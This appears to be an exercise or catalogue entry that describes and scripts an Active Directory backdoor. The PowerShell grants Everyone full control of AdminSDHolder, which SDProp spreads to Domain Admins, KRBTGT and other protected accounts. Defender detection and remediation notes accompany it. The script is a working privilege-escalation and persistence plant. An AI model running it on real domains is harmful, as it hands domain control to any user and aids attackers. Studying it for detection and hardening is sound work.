name: windows-adminsdholder-everyone-ace
description: Backdoor-class, DC-only: grants Everyone:GenericAll on the AdminSDHolder object, and SDProp propagates that ACL to every adminCount=1 principal (Domain Admins, KRBTGT, protected accounts) on its ~60-minute cycle. Any authenticated user — the weakest service account — can then write to protected groups and grant themselves domain administration. The script skips gracefully on member boxes (no AD module). Defender notice: Get-ACL on CN=AdminSDHolder,CN=System shows an Everyone ACE no domain should have; after the next SDProp pass, protected group ACLs show the same inheritance. Difficulty: hard — the plant is one ACE, the payoff is domain-wide, and the propagation delay hides the cause for up to an hour. Remediation: remove the ACE and re-run SDProp (or wait), then audit group memberships for changes made through it.
script:
# C3rberus-derived (windows_adminsdholder): EVERYONE:GenericAll ACE on
# AdminSDHolder; SDProp propagates to all protected objects. DC-ONLY.
$Error.Clear()
try {
    Import-Module ActiveDirectory -ErrorAction Stop
} catch {
    Write-Output "windows-adminsdholder-everyone-ace: not a domain controller (AD module absent); skipping."
    exit 0
}
$rootDn = (Get-ADRootDSE).defaultNamingContext
$sdHolder = [ADSI]"LDAP://CN=AdminSDHolder,CN=System,$rootDn"
$existing = @($sdHolder.ObjectSecurity.Access | Where-Object {
    ($_.AccessControlType -eq 'Allow') -and ($_.IdentityReference.Value -match 'Everyone') -and
    ($_.ActiveDirectoryRights.value__ -band ([System.DirectoryServices.ActiveDirectoryRights]::GenericAll.value__))
})
if ($existing.Count -gt 0) {
    Write-Output 'ADMINSDHOLDER: Everyone allow-ACE already present; no change'
    exit 0
}
$everyone = New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0')
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $everyone,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow)
$sdHolder.ObjectSecurity.AddAccessRule($rule) | Out-Null
$sdHolder.CommitChanges() | Out-Null
Write-Output "ADMINSDHOLDER: EVERYONE:GenericAll ACE applied to AdminSDHolder ($rootDn)"
